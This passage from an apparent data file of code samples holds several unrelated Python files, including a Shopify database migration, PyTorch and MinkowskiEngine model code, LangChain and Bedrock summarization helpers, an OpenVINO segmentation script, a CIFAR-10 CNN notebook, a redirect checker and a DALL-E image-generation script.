sa.Column('template_suffix', sqlmodel.sql.sqltypes.AutoString(), nullable=True),\n    sa.Column('admin_graphql_api_id', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('created_at', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('updated_at', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('published_at', sqlmodel.sql.sqltypes.AutoString(), nullable=True),\n    sa.Column('store_id', sa.Integer(), nullable=False),\n    sa.PrimaryKeyConstraint('id')\n    )\n    op.create_table('shopify_stores',\n    sa.Column('id', sa.Integer(), nullable=False),\n    sa.Column('name', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('email', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('access_token', sqlmodel.sql.sqltypes.AutoString(), nullable=True),\n    sa.PrimaryKeyConstraint('id')\n    )\n    op.create_table('shopify_themes',\n    sa.Column('id', sa.Integer(), nullable=False),\n    sa.Column('theme_id', sa.Integer(), nullable=False),\n    sa.Column('name', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('role', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('theme_store_id', sqlmodel.sql.sqltypes.AutoString(), nullable=True),\n    sa.Column('previewable', sa.Boolean(), nullable=False),\n    sa.Column('processing', sa.Boolean(), nullable=False),\n    sa.Column('admin_graphql_api_id', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('email', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('store_id', sa.Integer(), nullable=False),\n    sa.PrimaryKeyConstraint('id')\n    )\n    op.create_table('users',\n    sa.Column('id', sa.Integer(), nullable=False),\n    sa.Column('full_name', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('email', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.Column('password', sqlmodel.sql.sqltypes.AutoString(), nullable=False),\n    sa.PrimaryKeyConstraint('id'),\n    sa.UniqueConstraint('email')\n    )\n    # ### end Alembic commands ###\n\n\ndef downgrade() -> None:\n    # ### commands auto generated by Alembic - please adjust! ###\n    op.drop_table('users')\n    op.drop_table('shopify_themes')\n    op.drop_table('shopify_stores')\n    op.drop_table('shopify_pages')\n    # ### end Alembic commands ###\n",
    "import torch\nimport torch.nn as nn\nimport torch.nn.init as init\nimport torch.nn.functional as F\nfrom models.layers import STConvBlock, cal_cheb_polynomial,cal_laplacian\nimport ipdb\n\n#Minimum Mutual information\n# CLUB: Mutual Information Contrastive Learning Upper Bound\nclass CLUB(nn.Module):  \n    '''\n        This class provides the CLUB estimation to I(X,Y)\n        Method:\n            forward() :      provides the estimation with input samples  \n            loglikeli() :   provides the log-likelihood of the approximation q(Y|X) with input samples\n        Arguments:\n            x_dim, y_dim :         the dimensions of samples from X, Y respectively\n            hidden_size :          the dimension of the hidden layer of the approximation network q(Y|X)\n            x_samples, y_samples : samples from X and Y, having shape [sample_size, x_dim/y_dim] \n    '''\n    def __init__(self, x_dim, y_dim, hidden_size):\n        super(CLUB, self).__init__()\n        # p_mu outputs mean of q(Y|X)\n        #print(\"create CLUB with dim {}, {}, hiddensize {}\".format(x_dim, y_dim, hidden_size))\n        self.p_mu = nn.Sequential(nn.Linear(x_dim, hidden_size//2),\n                                       nn.ReLU(),\n                                       nn.Linear(hidden_size//2, y_dim))\n        # p_logvar outputs log of variance of q(Y|X)\n        self.p_logvar = nn.Sequential(nn.Linear(x_dim, hidden_size//2),\n                                       nn.ReLU(),\n                                       nn.Linear(hidden_size//2, y_dim),\n                                       nn.Tanh())\n\n    def get_mu_logvar(self, x_samples):\n        mu = self.p_mu(x_samples)\n        logvar = self.p_logvar(x_samples)\n        return mu, logvar\n    \n    def forward(self, x_samples, y_samples): \n        mu, logvar = self.get_mu_logvar(x_samples)\n        \n        # log of conditional probability of positive sample pairs\n        positive = - (mu - y_samples)**2 /2./logvar.exp()  \n        \n        prediction_1 = mu.unsqueeze(1)          # shape [nsample,1,dim]\n        y_samples_1 = y_samples.unsqueeze(0)    # shape [1,nsample,dim]\n\n        # log of conditional probability of negative sample pairs\n        negative = - ((y_samples_1 - prediction_1)**2).mean(dim=1)/2./logvar.exp() \n\n        return (positive.sum(dim = -1) - negative.sum(dim = -1)).mean()\n\n    def loglikeli(self, x_samples, y_samples): # unnormalized loglikelihood \n        mu, logvar = self.get_mu_logvar(x_samples)\n        return (-(mu - y_samples)**2 /logvar.exp()-logvar).sum(dim=1).mean(dim=0)\n    \n    def learning_loss(self, x_samples, y_samples):\n        return - self.loglikeli(x_samples, y_samples)\n\nclass ST_encoder(nn.Module):\n    def __init__(self, num_nodes, d_input, d_output, Ks, Kt, blocks, input_window, drop_prob, device):\n        super().__init__()\n        self.num_nodes = num_nodes\n        self.feature_dim = d_output\n        self.output_dim = d_output\n\n        self.Ks = Ks\n        self.Kt = Kt\n        self.blocks = blocks\n        self.input_window = input_window\n        self.output_window = 1\n        self.drop_prob = drop_prob\n\n\n        self.blocks[0][0] = self.feature_dim\n        if self.input_window - len(self.blocks) * 2 * (self.Kt - 1) <= 0:\n            raise ValueError('Input_window must bigger than 4*(Kt-1) for 2 STConvBlock'\n                             ' have 4 kt-kernel convolutional layer.')\n        self.device = device\n        self.input_conv=nn.Conv2d(d_input, d_output, 1)\n\n        self.st_conv1 = STConvBlock(self.Ks, self.Kt, self.num_nodes,\n                                    self.blocks[0], self.drop_prob, self.device)\n        self.st_conv2 = STConvBlock(self.Ks, self.Kt, self.num_nodes,\n                                    self.blocks[1], self.drop_prob, self.device)\n\n    def forward(self, x ,graph):\n        # (batch_size, input_length, num_nodes, feature_dim)nclv\n\n        lap_mx = cal_laplacian(graph)\n        Lk = cal_cheb_polynomial(lap_mx, self.Ks)\n\n        # ipdb.set_trace()\n        # print(x.shape)\n        x=self.input_conv(x)\n        x_st1 = self.st_conv1(x,Lk)   # (batch_size, c[2](64), input_length-kt+1-kt+1, num_nodes)\n        x_st2 = self.st_conv2(x_st1,Lk)  # (batch_size, c[2](128), input_length-kt+1-kt+1-kt+1-kt+1, num_nodes)\n\n        return x_st2\n\n    def variant_encode(self,x,graph):\n        x=self.input_conv(x)\n        x_st1 = self.st_conv1(x, graph)   # (batch_size, c[2](64), input_length-kt+1-kt+1, num_nodes)\n        x_st2 = self.st_conv2(x_st1, graph)  # (batch_size, c[2](128), input_length-kt+1-kt+1-kt+1-kt+1, num_nodes)\n        return x_st2",
    "\"\"\"Functions related to setting up the agents' chains.\"\"\"\n\nfrom langchain_anthropic import ChatAnthropic\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom .prompt_functions import get_crawler_template, get_summarize_template, get_broad_links_template, get_explain_links_template\n\ndef get_crawler_chain(chat:ChatAnthropic):\n    \"\"\"\n    Sets the model to get the chain for the crawling agent.\n    \n    Args:\n        chat (ChatAnthropic): Chat model to use.\n    \n    Returns:\n        crawler_chain: crawling agent.\n    \"\"\"\n    crawler_system, crawler_template = get_crawler_template()\n    crawler_prompt = ChatPromptTemplate.from_messages([(\"system\", crawler_system), (\"human\", crawler_template)])\n    crawler_chain = crawler_prompt | chat\n    return crawler_chain\n\ndef get_summarize_chain(chat:ChatAnthropic):\n    \"\"\"\n    Sets the model to get the chain for the summarizing agent.\n    \n    Args:\n        chat (ChatAnthropic): Chat model to use.\n    \n    Returns:\n        summarize_chain: summarizing agent.\n    \"\"\"\n    summarize_system, summarize_template = get_summarize_template() \n    prompt = ChatPromptTemplate.from_messages([(\"system\", summarize_system), (\"human\", summarize_template)])\n    summarize_chain = prompt | chat\n    return summarize_chain\n\ndef get_broad_links_chain(chat:ChatAnthropic):\n    \"\"\"\n    Sets the model to get the chain for the agent tasked to get broad links from the links available.\n    \n    Args:\n        chat (ChatAnthropic): Chat model to use.\n    \n    Returns:\n        broad_links_chain: agent tasked to get broad links from the links available.\n    \"\"\"\n    broad_links_system, broad_links_template = get_broad_links_template()\n    broad_links_prompt = ChatPromptTemplate.from_messages([(\"system\", broad_links_system), (\"human\", broad_links_template)])\n    broad_links_chain = broad_links_prompt | chat\n    return broad_links_chain\n\ndef get_explain_links_chain(chat:ChatAnthropic):\n    \"\"\"\n    Sets the model to get the chain for the agent tasked tasked to explain the links' usefulness related to the objective.\n    \n    Args:\n        chat (ChatAnthropic): Chat model to use.\n    \n    Returns:\n        explain_links_chain: agent tasked to explain the links' usefulness related to the objective.\n    \"\"\"\n    explain_links_system, explain_links_template = get_explain_links_template()\n    explain_links_prompt = ChatPromptTemplate.from_messages([(\"system\", explain_links_system), (\"human\", explain_links_template)])\n    explain_links_chain = explain_links_prompt | chat\n    return explain_links_chain",
    "import openvino as ov\nfrom openvino import get_version\nimport cv2\nimport numpy as np\nimport collections\nimport matplotlib.pyplot as plt\nimport time\nfrom IPython import display\nfrom typing import Union, Tuple, NamedTuple, Optional, List\nfrom pathlib import Path\nimport threading\nimport os\nfrom os import PathLike\nimport platform\n\nprint('''\u26a0\ufe0f Intel\u00ae Confidential. For Internal Use ONLY\n\u2709\ufe0f Contact: Ryan Loney (ryan.loney@intel.com)''')\n\n# Get OpenVINO version and print in console\ninstalled_version = get_version()\nprint(f\"\u2699\ufe0f OpenVINO version: {installed_version}\")\nprint(f\"\u2699\ufe0f Current OS: {platform.platform()}\")\n\ncore = ov.Core()\nir_model_path = Path(\"selfie_multiclass_256x256.xml\")\nov_model = core.read_model(ir_model_path)\nprint(\"\u2705 OpenVINO background segmentation model read from disk\")\n\n# Get available devices\ndevices = core.available_devices\n\n# If NPU is available, use it, otherwise switch to CPU (for older PCs)\nif 'NPU' in devices:\n    device = 'NPU'\n    print(\"\u2705 NPU detected - NPU set as inference device.\")\nelse:\n    device = 'CPU'\n    print(\"\ud83d\udfe8 NO NPU DEVICE DETECTED - Using CPU device instead.\") \n\n\ncompiled_model = core.compile_model(ov_model, device)\nprint(f\"\u2705 OpenVINO background segmentation model loaded on {device} device.\")\n\n\ndef load_image(path: str) -> np.ndarray:\n    \"\"\"\n    Loads an image from `path` and returns it as BGR numpy array. `path`\n    should point to an image file, either a local filename or a url. The image is\n    not stored to the filesystem. Use the `download_file` function to download and\n    store an image.\n    :param path: Local path name or URL to image.\n    :return: image as BGR numpy array\n    \"\"\"\n    import cv2\n    import requests\n\n    if path.startswith(\"http\"):\n        # Set User-Agent to Mozilla because some websites block\n        # requests with User-Agent Python\n        response = requests.get(path, headers={\"User-Agent\": \"Mozilla/5.0\"})\n        array = np.asarray(bytearray(response.content), dtype=\"uint8\")\n        image = cv2.imdecode(array, -1)  # Loads the image as BGR\n    else:\n        image = cv2.imread(path)\n    return image\n\n\n# Read input image and convert it to RGB\nprint(\"\u2705 Loading sample PNG image\")\ntest_image_url = \"sample.png\"\nimg = load_image(test_image_url)\nimg = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\n\n# Preprocessing helper function\ndef resize_and_pad(image:np.ndarray, height:int = 256, width:int = 256):\n    \"\"\"\n    Input preprocessing function, takes input image in np.ndarray format, \n    resizes it to fit specified height and width with preserving aspect ratio \n    and adds padding on bottom or right side to complete target height x width rectangle.\n    \n    Parameters:\n      image (np.ndarray): input image in np.ndarray format\n      height (int, *optional*, 256): target height\n      width (int, *optional*, 256): target width\n    Returns:\n      padded_img (np.ndarray): processed image\n      padding_info (Tuple[int, int]): information about padding size, required for postprocessing\n    \"\"\"\n    h, w = image.shape[:2]\n    if h < w:\n        img = cv2.resize(image, (width, np.floor(h / (w / width)).astype(int)))\n    else:\n        img = cv2.resize(image, (np.floor(w / (h / height)).astype(int), height))\n    \n    r_h, r_w = img.shape[:2]\n    right_padding = width - r_w\n    bottom_padding = height - r_h\n    padded_img = cv2.copyMakeBorder(img, 0, bottom_padding, 0, right_padding, cv2.BORDER_CONSTANT)\n    return padded_img, (bottom_padding, right_padding)\n\n# Apply preprocessig step - resize and pad input image\npadded_img, pad_info = resize_and_pad(np.array(img))\n\n# Convert input data from uint8 [0, 255] to float32 [0, 1] range and add batch dimension\nnormalized_img = np.expand_dims(padded_img.astype(np.float32) / 255, 0)\n\n\n# ### Run model inference\nout = compiled_model(normalized_img)[0]\nprint(\"\u2705 Test inference on sample image complete\")\n\n\nclass Label(NamedTuple):\n    index: int\n    color: Tuple\n    name: Optional[str] = None\n\nclass SegmentationMap(NamedTuple):\n    labels: List\n\n    def get_colormap(self):\n        return np.array([label.color for label in self.labels])\n\n    def get_labels(self):\n        labelnames = [label.name for label in self.labels]\n        if any(labelnames):\n            return labelnames\n        else:\n            return None\n\ndef segmentation_map_to_image(\n    result: np.ndarray, colormap: np.ndarray, remove_holes: bool = False\n) -> np.ndarray:\n    \"\"\"\n    Convert network result of floating point numbers to an RGB image with\n    integer values from 0-255 by applying a colormap.\n    :param result: A single network result after converting to pixel values in H,W or 1,H,W shape.\n    :param colormap: A numpy array of shape (num_classes, 3) with an RGB value per class.\n    :param remove_holes: If True, remove holes in the segmentation result.\n    :return: An RGB image where each pixel is an int8 value according to colormap.\n    \"\"\"\n    import cv2\n    if len(result.shape) != 2 and result.shape[0] != 1:\n        raise ValueError(\n            f\"Expected resul",
    "# -*- coding: utf-8 -*-\n\"\"\"Redes Neurais Convolucionais.ipynb\n\nAutomatically generated by Colab.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/1kIks0urNOuVHwYqPZOjIx4Npg731ka0H\n\"\"\"\n\nimport tensorflow as tf\nfrom tensorflow.keras import datasets, layers, models\nimport matplotlib.pyplot as plt\nimport numpy as np\n\n(train_images, train_labels), (test_images, test_labels) = datasets.cifar10.load_data()\n\n# Normaliza\u00e7\u00e3o de Pixels entre 0 e 1\ntrain_images, test_images = train_images / 255.0, test_images / 255.0\n\n# Visualizando uma amostra dos dados\nclass_names = ['airplane', 'automobile', 'bird', 'cat', 'deer',\n               'dog', 'frog', 'horse', 'ship', 'truck']\n\nplt.figure(figsize=(10,10))\nfor i in range(16):\n    plt.subplot(4,4,i+1)\n    plt.xticks([])\n    plt.yticks([])\n    plt.grid(False)\n    plt.imshow(train_images[i], cmap=plt.cm.binary)\n\n    plt.xlabel(class_names[train_labels[i][0]], fontsize=15)\nplt.show()\n\nmodel = models.Sequential(name='CNN-CIFAR10')\nmodel.add(layers.Conv2D(32, (3, 3), activation='relu', input_shape=(32, 32, 3)))\nmodel.add(layers.MaxPooling2D((2, 2)))\nmodel.add(layers.Conv2D(64, (3, 3), activation='relu'))\nmodel.add(layers.MaxPooling2D((2, 2)))\nmodel.add(layers.Conv2D(64, (3, 3), activation='relu'))\nmodel.add(layers.Flatten())\nmodel.add(layers.Dense(64, activation='relu'))\nmodel.add(layers.Dense(10))\n\nmodel.summary()\n\nmodel.compile(optimizer='adam',\n              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=True),\n              metrics=['accuracy'])\n\nhistory = model.fit(train_images, train_labels, epochs=3,\n                    validation_data=(test_images, test_labels))\n\nplt.figure(figsize=(10,4))\n\nplt.subplot(1,2,1)\nplt.plot(history.history['accuracy'], label='Acur\u00e1cia de Treino')\nplt.plot(history.history['val_accuracy'], label = 'Acur\u00e1cia de Valida\u00e7\u00e3o')\nplt.xlabel('\u00c9poca')\nplt.ylabel('Acur\u00e1cia')\nplt.ylim([0.5, 1])\nplt.legend(loc='upper right')\n\nplt.subplot(1,2,2)\nplt.plot(history.history['loss'], label='Perda de Treino')\nplt.plot(history.history['val_loss'], label = 'Perda de Valida\u00e7\u00e3o')\nplt.xlabel('\u00c9poca')\nplt.ylabel('Perda')\nplt.legend(loc='upper right')\n\nplt.show()\n\ndef plot_image(i, predictions_array, true_label, img):\n  predictions_array, true_label, img = predictions_array[i], true_label[i], img[i]\n  plt.grid(False)\n  plt.xticks([])\n  plt.yticks([])\n\n  plt.imshow(img, cmap=plt.cm.binary)\n\n  predicted_label = np.argmax(predictions_array)\n  if predicted_label == true_label:\n    color = 'blue'\n  else:\n    color = 'red'\n\n  plt.xlabel(\"{} {:2.0f}% ({})\".format(class_names[predicted_label],\n                                100*np.max(predictions_array),\n                                class_names[int(true_label)]),\n                                color=color)\n\ndef plot_value_array(i, predictions_array, true_label):\n  predictions_array, true_label = predictions_array[i], true_label[i]\n  plt.grid(False)\n  plt.xticks([])\n  plt.yticks([])\n  thisplot = plt.bar(range(10), predictions_array, color=\"#777777\")\n  plt.ylim([0, 1])\n  predicted_label = np.argmax(predictions_array)\n\n  thisplot[predicted_label].set_color('red')\n  thisplot[true_label].set_color('blue')\n\npredictions = model.predict(test_images)\n\npredictions[0]\n\nnp.argmax(predictions[0])\n\ni = 15\nplt.figure(figsize=(6,3))\nplot_image(i, predictions, test_labels, test_images)\nplt.show()",
    "import torch\nimport MinkowskiEngine as ME\nfrom functional import bound\n\nfrom data_utils import isin, istopk\n\n\ndef make_layer(block, block_layers, channels):\n    \"\"\"make stacked InceptionResNet layers.\n    \"\"\"\n    layers = []\n    for i in range(block_layers):\n        layers.append(block(channels=channels))\n\n    return torch.nn.Sequential(*layers)\n\nclass get_coordinate(torch.nn.Module):\n    def __init__(self):\n        super(get_coordinate, self).__init__()\n        self.SumPooling = ME.MinkowskiSumPooling(kernel_size=2, stride=2, dilation=1, dimension=3)\n\n    def forward(self, input):\n        coordinate1 = self.SumPooling(input)\n        coordinate2 = self.SumPooling(coordinate1)\n        coordinate3 = self.SumPooling(coordinate2)\n\n        return coordinate2, coordinate3\n\nclass Encoder(torch.nn.Module):\n    def __init__(self, channels=[3, 64, 128]):\n        super().__init__()\n        self.conv0 = ME.MinkowskiConvolution(\n            in_channels=channels[0],\n            out_channels=channels[1],\n            kernel_size=3,\n            stride=1,\n            bias=True,\n            dimension=3)\n        self.down0 = ME.MinkowskiConvolution(\n            in_channels=channels[1],\n            out_channels=channels[2],\n            kernel_size=3,\n            stride=2,\n            bias=True,\n            dimension=3)\n\n        self.conv1 = ME.MinkowskiConvolution(\n            in_channels=channels[2],\n            out_channels=channels[2],\n            kernel_size=3,\n            stride=1,\n            bias=True,\n            dimension=3)\n        self.down1 = ME.MinkowskiConvolution(\n            in_channels=channels[2],\n            out_channels=channels[2],\n            kernel_size=3,\n            stride=2,\n            bias=True,\n            dimension=3)\n\n        self.conv2 = ME.MinkowskiConvolution(\n            in_channels=channels[2],\n            out_channels=channels[2],\n            kernel_size=3,\n            stride=1,\n            bias=True,\n            dimension=3)\n        self.down2 = ME.MinkowskiConvolution(\n            in_channels=channels[2],\n            out_channels=channels[2],\n            kernel_size=3,\n            stride=2,\n            bias=True,\n            dimension=3)\n\n        self.relu = ME.MinkowskiReLU(inplace=True)\n\n    def forward(self, x):\n        # no IRN\n        out0 = self.relu(self.down0(self.conv0(x)))\n        out1 = self.relu(self.down1(self.conv1(out0)))\n        out2 = self.down2(self.conv2(out1))\n        out_cls_list = [out2, out1, out0]\n\n        return out_cls_list\n\n\nclass Decoder(torch.nn.Module):\n    \"\"\"the decoding network with upsampling.\n    \"\"\"\n\n    def __init__(self, channels=[3, 64, 128]):\n        super().__init__()\n        self.up0 = ME.MinkowskiConvolutionTranspose(\n            in_channels=channels[2],\n            out_channels=channels[2],\n            kernel_size=3,\n            stride=2,\n            bias=True,\n            dimension=3)\n        self.conv0 = ME.MinkowskiConvolution(\n            in_channels=channels[2],\n            out_channels=channels[2],\n            kernel_size=3,\n            stride=1,\n            bias=True,\n            dimension=3)\n\n        self.up1 = ME.MinkowskiConvolutionTranspose(\n            in_channels=channels[2],\n            out_channels=channels[2],\n            kernel_size=3,\n            stride=2,\n            bias=True,\n            dimension=3)\n        self.conv1 = ME.MinkowskiConvolution(\n            in_channels=channels[2],\n            out_channels=channels[2],\n            kernel_size=3,\n            stride=1,\n            bias=True,\n            dimension=3)\n\n        self.up2 = ME.MinkowskiConvolutionTranspose(\n            in_channels=channels[2],\n            out_channels=channels[1],\n            kernel_size=3,\n            stride=2,\n            bias=True,\n            dimension=3)\n        self.conv2 = ME.MinkowskiConvolution(\n            in_channels=channels[1],\n            out_channels=channels[0],\n            kernel_size=3,\n            stride=1,\n            bias=True,\n            dimension=3)\n\n        self.relu = ME.MinkowskiReLU(inplace=True)\n\n\n    def forward(self, x):\n        # no IRN\n        out2 = self.relu(self.conv0(self.up0((x))))\n        out1 = self.relu(self.conv1(self.up1(out2)))\n        out0 = self.conv2(self.up2(out1))\n\n        out_cls_list = [out2, out1, out0]\n\n        return out_cls_list, out0\n\n\nclass HPEncoder(torch.nn.Module):\n    def __init__(self, channels=[128, 128, 128]):\n        super().__init__()\n        self.conv0 = ME.MinkowskiConvolution(\n            in_channels=channels[0],\n            out_channels=channels[0],\n            kernel_size=3,\n            stride=1,\n            bias=True,\n            dimension=3)\n\n        self.conv1 = ME.MinkowskiConvolution(\n            in_channels=channels[0],\n            out_channels=channels[1],\n            kernel_size=3,\n            stride=1,\n            bias=True,\n            dimension=3)\n        self.down1 = ME.MinkowskiConvolution(\n            in_channels=channels[1],\n            out_channels=channels[1],\n  ",
    "import csv\nimport argparse\nimport requests\nfrom termcolor import colored\n\ndef verify_redirects(file_path):\n    results = []\n    with open(file_path, newline='', encoding='utf-8-sig') as csvfile:\n        reader = csv.DictReader(csvfile)\n        for line_number, row in enumerate(reader, start=1):\n            try:\n                source_url = row['source_url'].strip()\n                target_url = row['target_url'].strip()\n                expected_code = int(row['code'].strip())\n\n                response = requests.get(source_url, allow_redirects=False)\n                actual_code = response.status_code\n                redirected_to = response.headers.get('Location', None)\n\n                is_correct_code = (actual_code == expected_code)\n                is_correct_target = (redirected_to == target_url if redirected_to else False)\n\n                results.append((source_url, target_url, expected_code, actual_code, redirected_to, is_correct_code, is_correct_target, line_number))\n\n            except requests.RequestException as e:\n                results.append((source_url, target_url, expected_code, 'Error', 'Error', False, False, line_number))\n            except KeyError as e:\n                print(colored(f\"Missing key in CSV: {e}, Line: {line_number}\", 'red'))\n                break\n\n    return results\n\ndef generate_html_report(results, output_file, title):\n    color = 'green' if 'Successful' in title else 'red'\n    html_content = f'''\n    <html>\n    <head>\n        <title>{title}</title>\n    </head>\n    <body>\n        <h1>{title}</h1>\n        <table border=\"1\" style=\"width: 100%;\">\n            <tr>\n                <th>Source URL</th>\n                <th>Target URL</th>\n                <th>Expected Code</th>\n                <th>Actual Code</th>\n                <th>Redirected To</th>\n                <th>Correct Code</th>\n                <th>Correct Target</th>\n                <th>Line Number</th>\n            </tr>\n    '''\n    for entry in results:\n        html_content += f'''\n            <tr style=\"color: {color};\">\n                <td>{entry[0]}</td>\n                <td>{entry[1]}</td>\n                <td>{entry[2]}</td>\n                <td>{entry[3]}</td>\n                <td>{entry[4] or 'None'}</td>\n                <td>{'Yes' if entry[5] else 'No'}</td>\n                <td>{'Yes' if entry[6] else 'No'}</td>\n                <td>{entry[7]}</td>\n            </tr>\n        '''\n\n    html_content += '''\n        </table>\n    </body>\n    </html>\n    '''\n    with open(output_file, 'w') as file:\n        file.write(html_content)\n\n    print(f\"Report generated: {output_file}\")\n\n# Main execution\nif __name__ == \"__main__\":\n    # Create the parser\n    parser = argparse.ArgumentParser(description='Verify redirects and generate report')\n\n    # Add the arguments\n    parser.add_argument('csv_file', metavar='csv_file', type=str, help='the path to the csv file')\n    parser.add_argument('results_prefix', metavar='results_prefix', type=str, help='the prefix for results files')\n\n    # Parse the command line arguments\n    args = parser.parse_args()\n\n    # Get the CSV file and results prefix from arguments\n    csv_file = args.csv_file\n    results_prefix = args.results_prefix\n\n    results = verify_redirects(csv_file)\n    successes = [res for res in results if res[5] and res[6]]\n    errors = [res for res in results if not (res[5] and res[6])]\n    generate_html_report(successes, f'results/{results_prefix}_redirect_verification_success.html',\n                         'URL Redirect Verification Report - Successful')\n    generate_html_report(errors, f'results/{results_prefix}_redirect_verification_error.html',\n                         'URL Redirect Verification Report - Errors')\n\n",
    "import json\nimport boto3\nfrom bs4 import BeautifulSoup\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.llms.bedrock import Bedrock\nfrom langchain import PromptTemplate\nfrom langchain.chains.summarize import load_summarize_chain\nimport time\n\ndef extract_agenda_items(data):\n    extracted_data = []\n    try:\n        for item in data['agenda_items']:\n            soup = BeautifulSoup(item['content'], 'html.parser')\n            text = soup.get_text(separator='/n', strip=True)\n            extracted_data.append({'item_number': item['item_number'], 'text': text})\n    except:\n        print(\"No agenda items found\")\n    return extracted_data\n\ndef generate_agenda_string(extracted_data):\n    Agenda = [item['text'] for item in extracted_data]\n    agenda_string = \"Meeting Agenda: \\n\"\n    for j, item_text in enumerate(Agenda):\n        agenda_string += f\"{j+1}. {item_text} \\n\"\n    return agenda_string\n\ndef process_transcript(data):\n    text_splitter = RecursiveCharacterTextSplitter(\n        separators=[\"\\n\\n\", \"\\n\", \".\"], chunk_size=15000, chunk_overlap=3000\n    )\n    docs = text_splitter.create_documents([data['transcript']])\n    return docs\n\ndef initialize_bedrock():\n    boto3_bedrock = boto3.client(service_name='bedrock-runtime')\n    modelId = \"ai21.j2-ultra-v1\"\n    llm = Bedrock(\n        model_id=modelId,\n        model_kwargs={\n            \"maxTokens\": 8191,\n            \"stopSequences\": [],\n            \"temperature\": 0,\n            \"topP\": 1\n        },\n        client=boto3_bedrock,\n    )\n    return llm\n\ndef summarize_text(llm, docs):\n    map_prompt = \"\"\"\n    Write a detailed summary of the following:\n    \"{text}\"\n    SUMMARY:\n    \"\"\"\n    map_prompt_template = PromptTemplate(template=map_prompt, input_variables=[\"text\"])\n    combine_prompt = \"\"\"\n    Write a detailed summary of the following text delimited by triple backquotes.\n    Return your response which covers all the key points of the text.\n    ```{text}```\n    SUMMARY:\n    \"\"\"\n    combine_prompt_template = PromptTemplate(template=combine_prompt, input_variables=[\"text\"])\n    summary_chain = load_summarize_chain(llm=llm, chain_type=\"map_reduce\", verbose=True, return_intermediate_steps=True, map_prompt=map_prompt_template,\n                                         combine_prompt=combine_prompt_template)\n    output = summary_chain.invoke(docs)\n    return output\n\ndef lambda_handler(event, context):\n    # s3 = boto3.client('s3')\n    \n    # # Download the JSON file from the source S3 bucket\n    # # Get source data from S3  \n    # bucket = event['Records'][0]['s3']['bucket']['name']\n    # key = event['Records'][0]['s3']['object']['key']\n\n    \n    # # Read JSON file\n    # json_object = s3.get_object(Bucket=bucket, Key=key)\n    # data = json.load(json_object['Body'])\n\n    with open('prs_meeting_20240208_api_request.json', 'r') as json_file:\n        data = json.load(json_file)\n    \n    # Extract agenda items\n    try:\n        extracted_data = extract_agenda_items(data)\n    except:\n        print(\"No agenda found\")\n    \n    # Generate agenda string\n    try:\n        agenda_string = generate_agenda_string(extracted_data)\n    except:\n        print(\"No agenda found\")\n    \n    # Process transcript\n    docs = process_transcript(data)\n    \n    # Initialize Bedrock\n    llm = initialize_bedrock()\n    \n    # Summarize text\n    s_time = time.time()\n    output = summarize_text(llm, docs)\n    e_time = time.time()\n    print(\"Time: \", e_time - s_time)\n    \n    # Upload summary to the destination S3 bucket\n    # s3.put_object(Body=output['output_text'], Bucket='summary-bucket', Key='summary.txt')\n    print(\"Output: \", output['output_text'])\n    return {\n        'statusCode': 200,\n        'body': json.dumps('Summary generated and uploaded successfully!')\n    }\n\n\n",
    "import logging\nfrom openai import OpenAI\nimport requests\nimport os\nimport time\n\nfileloc = input('Input prompt file location...\\n')\nuser_key = input('Input your OpenAI API Key...\\n')\nset_temp = input('Input temperature from 0.0 to 2.0 with anything above 0.8 as being a bit nutty...\\n')\ncontext = input('Type any additional context you wish to provide the prompts e.g. Create an expanded prompt of no more than 40 words to create a high quality and realistic photo\\n')\n\nchrome_path = 'open -a /Applications/Google\\ Chrome.app %s'\n\nclient = OpenAI(api_key=user_key)\n\nlogging.basicConfig(level=logging.INFO)\n\nprint(\"Generating images using DALL-E 3...\")\n\ndirectory = \"./images/\"\nif not os.path.exists(directory):\n    os.makedirs(directory)\n\nwith open(fileloc) as file:\n    while line := file.readline():\n        start_time = time.time()\n        print(\"=====>\" + line.rstrip())\n\n        prompt_context = context + \" based on %s\" % line\n         \n        response = client.chat.completions.create(\n            model=\"gpt-4\",\n            n=1,\n            temperature=float(set_temp),\n            messages=[\n                {\"role\": \"system\", \"content\": \"You are an assistant that creatively expands prompts.\"},\n                {\"role\": \"user\", \"content\": prompt_context},\n            ]\n        )\n\n        # PROMPT = response['choices'][0]['message']['content']\n\n        PROMPT = response.choices[0].message.content\n        print(\"EXPANDED PROMPT: \" + PROMPT)\n\n        response = client.images.generate(\n            model=\"dall-e-3\",\n            prompt=PROMPT,\n            size=\"1792x1024\",\n            # quality=\"standard\",\n            # style=\"natural\",\n            n=1,\n        )\n\n        image_url = response.data[0].url\n        print(\"IMAGE URL: \" + image_url)\n        \n        print(\"Downloading...\")\n        image_file = requests.get(image_url)\n        clean_line = line.strip()\n        filename = \"./images/%s.png\" % clean_line\n        open(filename, 'wb').write(image_file.content)\n\n        end_time = time.time()\n        elapsed = end_time - start_time\n        print(\"TIME TO COMPLETE OPERATION (sec): \", elapsed)\n        time.sleep(30)",
